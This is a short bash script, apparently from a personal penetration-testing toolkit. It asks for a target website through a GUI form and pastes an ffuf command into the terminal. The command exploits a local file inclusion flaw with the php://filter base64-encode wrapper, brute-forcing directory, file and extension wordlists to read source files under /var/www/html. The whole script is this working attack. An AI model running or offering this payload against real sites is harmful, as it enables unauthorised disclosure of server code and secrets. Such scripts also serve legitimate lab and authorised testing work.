#!/bin/bash

: '
fuzz for files in var www html with php filter base64
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Website"

WEBSITE=${form_data["Website"]}

paste_command "ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:DIR -w /usr/share/seclists/Discovery/Web-Content/common.txt:FILE -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt:EXT -u '${WEBSITE}php://filter/read=convert.base64-encode/resource=/var/www/html/DIR/FILE.EXT' -fs 0"